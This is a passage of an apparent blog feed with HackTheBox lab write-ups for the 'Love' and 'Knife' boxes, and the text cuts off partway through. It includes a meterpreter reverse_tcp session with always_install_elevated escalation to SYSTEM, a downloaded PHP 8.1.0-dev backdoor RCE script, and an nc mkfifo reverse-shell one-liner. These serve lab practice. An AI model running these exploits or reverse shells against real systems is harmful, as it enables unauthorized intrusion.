 ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.10.17.216     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     6666             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:6666 </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>æ‰§è¡Œsb.exe</code></p><img src="/2021/08/05/HTB-love/image-20210805160641546.png" class><p><code>å¾—åˆ°shellï¼Œä½†æ˜¯ä¸èƒ½ææƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:6666 </span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.10.239</span><br><span class="line">[*] Meterpreter session 10 opened (10.10.17.216:6666 -&gt; 10.10.10.239:52612) at 2021-08-05 04:07:09 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: LOVE\Phoebe</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:</span><br><span class="line">[-] Named Pipe Impersonation (In Memory/Admin)</span><br><span class="line">[-] Named Pipe Impersonation (Dropper/Admin)</span><br><span class="line">[-] Token Duplication (In Memory/Admin)</span><br><span class="line">[-] Named Pipe Impersonation (RPCSS variant)</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p><code>ä½¿ç”¨always_install_elevatedææƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 10...</span><br><span class="line">msf6 exploit(multi/handler) &gt; sessions </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information         Connection</span><br><span class="line">  --  ----  ----                     -----------         ----------</span><br><span class="line">  10        meterpreter x86/windows  LOVE\Phoebe @ LOVE  10.10.17.216:6666 -&gt; 10.10.10.239:52612 (10.10.10.239)</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/local/always_install_elevated </span><br><span class="line">[*] Using configured payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; set session 10</span><br><span class="line">session =&gt; 10</span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/always_install_elevated):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION  10               yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.10.17.216     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     6666             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:6666 </span><br><span class="line">[*] Uploading the MSI to C:\Users\Phoebe\AppData\Local\Temp\pqfzrkZhtqhj.msi ...</span><br><span class="line">[*] Executing MSI...</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.10.239</span><br><span class="line">[+] Deleted C:\Users\Phoebe\AppData\Local\Temp\pqfzrkZhtqhj.msi</span><br><span class="line">[*] Meterpreter session 11 opened (10.10.17.216:6666 -&gt; 10.10.10.239:52625) at 2021-08-05 04:10:28 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\WINDOWS\system32</span><br><span class="line">meterpreter &gt; cd /</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\</span><br><span class="line">meterpreter &gt; dir</span><br><span class="line">Listing: C:\</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2015-07-10 07:04:22 -0400  $Recycle.Bin</span><br><span class="line">40777/rwxrwxrwx   0       dir   2021-04-12 16:17:58 -0400  $WinREAgent</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2021-04-12 15:55:58 -0400  Administration</span><br><span class="line">100666/rw-rw-rw-  1       fil   2015-07-10 09:20:06 -0400  BOOTNXT</span><br><span class="line">40777/rwxrwxrwx   0       dir   2015-07-10 08:21:38 -0400  Documents and Settings</span><br><span class="line">0000/---------    0       fif   1969-12-31 19:00:00 -0500  DumpStack.log.tmp</span><br><span class="line">40777/rwxrwxrwx   0       dir   2019-12-07 04:14:52 -0500  PerfLogs</span><br><span class="line">40555/r-xr-xr-x   4096    dir   2019-12-07 04:14:52 -0500  Program Files</span><br><span class="line">40555/r-xr-xr-x   4096    dir   2019-12-07 04:14:52 -0500  Program Files (x86)</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2019-12-07 04:14:52 -0500  ProgramData</span><br><span class="line">40777/rwxrwxrwx   0       dir   2021-04-12 15:18:22 -0400  Recovery</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2021-04-12 15:16:36 -0400  System Volume Information</span><br><span class="line">40555/r-xr-xr-x   4096    dir   2019-12-07 04:03:44 -0500  Users</span><br><span class="line">40777/rwxrwxrwx   16384   dir   2019-12-07 04:03:44 -0500  Windows</span><br><span class="line">100444/r--r--r--  395268  fil   2015-07-10 09:20:06 -0400  bootmgr</span><br><span class="line">0000/---------    0       fif   1969-12-31 19:00:00 -0500  pagefile.sys</span><br><span class="line">0000/---------    0       fif   1969-12-31 19:00:00 -0500  swapfile.sys</span><br><span class="line">40777/rwxrwxrwx   12288   dir   2021-04-12 11:16:48 -0400  xampp</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cd Users</span><br><span class="line">meterpreter &gt; dir</span><br><span class="line">Listing: C:\Users</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   8192  dir   2021-04-12 17:06:49 -0400  Administrator</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-07 04:30:39 -0500  All Users</span><br><span class="line">40555/r-xr-xr-x   8192  dir   2019-12-07 04:03:44 -0500  Default</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-07 04:30:39 -0500  Default User</span><br><span class="line">40777/rwxrwxrwx   8192  dir   2021-04-12 17:41:34 -0400  Phoebe</span><br><span class="line">40555/r-xr-xr-x   4096  dir   2019-12-07 04:14:52 -0500  Public</span><br><span class="line">100666/rw-rw-rw-  174   fil   2019-12-07 04:14:54 -0500  desktop.ini</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cd Administrator</span><br><span class="line">meterpreter &gt; dir</span><br><span class="line">Listing: C:\Users\Administrator</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">Mode              Size     Type  Last modified              Name</span><br><span class="line">----              ----     ----  -------------              ----</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:55:12 -0400  3D Objects</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:49 -0400  AppData</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Application Data</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:55:12 -0400  Contacts</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Cookies</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Desktop</span><br><span class="line">40555/r-xr-xr-x   4096     dir   2021-04-12 17:06:49 -0400  Documents</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Downloads</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Favorites</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Links</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Local Settings</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Music</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  My Documents</span><br><span class="line">100666/rw-rw-rw-  1048576  fil   2021-04-12 17:06:49 -0400  NTUSER.DAT</span><br><span class="line">100666/rw-rw-rw-  65536    fil   2021-04-12 17:06:50 -0400  NTUSER.DAT&#123;53b39e88-18c4-11ea-a811-000d3aa4692b&#125;.TM.blf</span><br><span class="line">100666/rw-rw-rw-  524288   fil   2021-04-12 17:06:50 -0400  NTUSER.DAT&#123;53b39e88-18c4-11ea-a811-000d3aa4692b&#125;.TMContainer0000000000</span><br><span class="line">                                                            0000000001.regtrans-ms</span><br><span class="line">100666/rw-rw-rw-  524288   fil   2021-04-12 17:06:50 -0400  NTUSER.DAT&#123;53b39e88-18c4-11ea-a811-000d3aa4692b&#125;.TMContainer0000000000</span><br><span class="line">                                                            0000000002.regtrans-ms</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  NetHood</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 18:00:20 -0400  OneDrive</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Pictures</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  PrintHood</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Recent</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Saved Games</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:55:12 -0400  Searches</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  SendTo</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Start Menu</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Templates</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Videos</span><br><span class="line">100666/rw-rw-rw-  316416   fil   2021-04-12 17:06:50 -0400  ntuser.dat.LOG1</span><br><span class="line">100666/rw-rw-rw-  90112    fil   2021-04-12 17:06:50 -0400  ntuser.dat.LOG2</span><br><span class="line">100666/rw-rw-rw-  20       fil   2021-04-12 17:06:50 -0400  ntuser.ini</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cd Desktop</span><br><span class="line">meterpreter &gt; dir</span><br><span class="line">Listing: C:\Users\Administrator\Desktop</span><br><span class="line">=======================================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  282   fil   2021-04-12 17:55:12 -0400  desktop.ini</span><br><span class="line">100444/r--r--r--  34    fil   2021-04-13 06:20:17 -0400  root.txt</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cat root.txt </span><br><span class="line">*************************************</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.ç®€è¿°&lt;/h2&gt;&lt;img src=&quot;/2021/08/05/HTB-love/image-20210805133747044.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-knife</title>
    <link href="https://lunamoore.github.io/2021/07/29/HTB-knife/"/>
    <id>https://lunamoore.github.io/2021/07/29/HTB-knife/</id>
    <published>2021-07-29T08:31:42.000Z</published>
    <updated>2021-07-29T08:33:52.220Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2021/07/29/HTB-knife/image-20210729150203513.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>åªå¼€æ”¾äº†22ã€80ç«¯å£</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/knife]</span><br><span class="line">â””â”€# nmap -sC -sV -sT 10.10.10.242 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-29 02:30 EDT</span><br><span class="line">Nmap scan report for 10.10.10.242</span><br><span class="line">Host is up (0.42s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)</span><br><span class="line">|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)</span><br><span class="line">|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title:  Emergent Medical Idea</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 57.03 seconds</span><br></pre></td></tr></table></figure><h2 id="0x02-è®¿é—®80ç«¯å£"><a href="#0x02-è®¿é—®80ç«¯å£" class="headerlink" title="0x02.è®¿é—®80ç«¯å£"></a>0x02.è®¿é—®80ç«¯å£</h2><p><code>æ‰‹åŠ¨çˆ¬è™«ä¸€æ³¢å•¥ä¹Ÿæ²¡æœ‰å‘ç°</code></p><img src="/2021/07/29/HTB-knife/image-20210729150450213.png" class><h2 id="0x03-åˆ—ä¸€æ³¢ç›®å½•"><a href="#0x03-åˆ—ä¸€æ³¢ç›®å½•" class="headerlink" title="0x03.åˆ—ä¸€æ³¢ç›®å½•"></a>0x03.åˆ—ä¸€æ³¢ç›®å½•</h2><p><code>ä¹Ÿæ˜¯ä»€ä¹ˆä¹Ÿæ²¡æœ‰</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# gobuster dir -u http://10.10.10.242 -w /usr/share/wordlists/dirb/common.txt                                                                                 1 â¨¯</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.10.242</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/07/29 02:50:15 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.hta                 (Status: 403) [Size: 277]</span><br><span class="line">/.htaccess            (Status: 403) [Size: 277]</span><br><span class="line">/.htpasswd            (Status: 403) [Size: 277]</span><br><span class="line">/index.php            (Status: 200) [Size: 5815]</span><br><span class="line">/server-status        (Status: 403) [Size: 277]</span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line">2021/07/29 02:53:11 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x04-webæŒ‡çº¹æœé›†"><a href="#0x04-webæŒ‡çº¹æœé›†" class="headerlink" title="0x04.webæŒ‡çº¹æœé›†"></a>0x04.webæŒ‡çº¹æœé›†</h2><p><code>å‘ç°PHP/8.1.0-devï¼Œæœ€è¿‘åˆšçˆ†å‡ºä¸€ä¸ªæ¼æ´</code><span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3BocC84LjEtYmFja2Rvb3Iv">è¯¦æƒ…å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/knife]</span><br><span class="line">â””â”€# whatweb http://10.10.10.242/                                                                                                                              130 â¨¯</span><br><span class="line">http://10.10.10.242/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]</span><br></pre></td></tr></table></figure><h2 id="0x05-exploit-dbæœç´¢"><a href="#0x05-exploit-dbæœç´¢" class="headerlink" title="0x05.exploit-dbæœç´¢"></a>0x05.exploit-dbæœç´¢</h2><img src="/2021/07/29/HTB-knife/image-20210729151157463.png" class><h2 id="0x06-ä¸‹è½½åˆ©ç”¨"><a href="#0x06-ä¸‹è½½åˆ©ç”¨" class="headerlink" title="0x06.ä¸‹è½½åˆ©ç”¨"></a>0x06.ä¸‹è½½åˆ©ç”¨</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/raw/49933</span><br><span class="line">mv 49933 php8.1.0.rce.py</span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/knife]</span><br><span class="line">â””â”€# python3 php8.1.0.rce.py</span><br><span class="line">Enter the full host url:</span><br><span class="line">http://10.10.10.242</span><br><span class="line"></span><br><span class="line">Interactive shell is opened on http://10.10.10.242</span><br><span class="line">Can&#x27;t acces tty; job crontol turned off.</span><br><span class="line"><span class="meta">$</span><span class="bash"> whoami</span></span><br><span class="line">james</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">pwd</span></span></span><br><span class="line">/</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /home/james/user.txt</span></span><br><span class="line">**********************</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><h2 id="0x07-ææƒ"><a href="#0x07-ææƒ" class="headerlink" title="0x07.ææƒ"></a>0x07.ææƒ</h2><h3 id="01-åå¼¹shell"><a href="#01-åå¼¹shell" class="headerlink" title="01.åå¼¹shell"></a>01.åå¼¹shell</h3><p><code>è¿™ä¸ªshellå¤ªéš¾çœ‹ï¼Œåå¼¹ä¸ªshellå›æ¥ï¼Œkaliå…ˆç›‘å¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ç›®æ ‡ä¸»æœºæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc your_ip your_port &gt;/tmp/f</span></span><br></pre></td></tr></table></figure><p><code>è¿”å›shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# nc -nvlp 6666                                                                                                                                               1 â¨¯</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.242] 34644</span><br><span class="line">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line"><span class="meta">$</span><span class="bash"> id</span></span><br><span class="line">uid=1000(james) gid=1000(james) groups=1000(james)</span><br><span class="line"><span class="meta">$</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="02-sudo-lææƒ"><a href="#02-sudo-lææƒ" class="headerlink" title="02.sudo -lææƒ"></a>02.sudo -lææƒ</h3><p><code>sudo -lå‘ç°knifeå‘½ä»¤(ç‚¹é¢˜äº†ã€‚ã€‚ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo -l</span></span><br><span class="line">Matching Defaults entries for james on knife:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User james may run the following commands on knife:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/knife</span><br><span class="line"><span class="meta">$</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ç›´æ¥æ•²knifeå°±å¯ä»¥çœ‹åˆ°ä»–çš„å‚æ•°ä¸infoï¼Œå¤ªå¤šäº†ï¼Œå°±åˆ—å‡ºexecæ¨¡å—</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 